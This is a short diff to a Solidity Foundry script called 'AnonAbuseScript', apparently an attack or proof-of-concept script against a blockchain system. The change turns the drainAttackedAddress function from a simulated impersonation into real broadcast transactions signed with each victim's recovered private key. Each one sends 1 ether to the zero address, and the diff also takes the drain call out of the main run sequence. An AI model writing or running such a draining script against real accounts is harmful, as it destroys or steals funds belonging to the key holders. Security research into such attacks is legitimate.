@@ -30,10 +30,6 @@ contract AnonAbuseScript is Script, Loader {
 
         logBalances("pre-attack state");
 
-        drainAttackedAddress();
-
-        logBalances("post-attack state");
-
         vm.startBroadcast();
 
         populateContractStructure();
@@ -50,9 +46,11 @@ contract AnonAbuseScript is Script, Loader {
 
     function drainAttackedAddress() public {
         for (uint i = 0; i < NUM_ADDRESS; i++) {
-            vm.prank(userDatas[i].compressedPublicKey);
+            uint256 pk = uint256(userDatas[i].privateKey);
+            vm.startBroadcast(pk);
             address targetAddress = address(0x00000000000000000000);
             payable(targetAddress).transfer(1 ether);
+            vm.stopBroadcast();
         }
     }
 
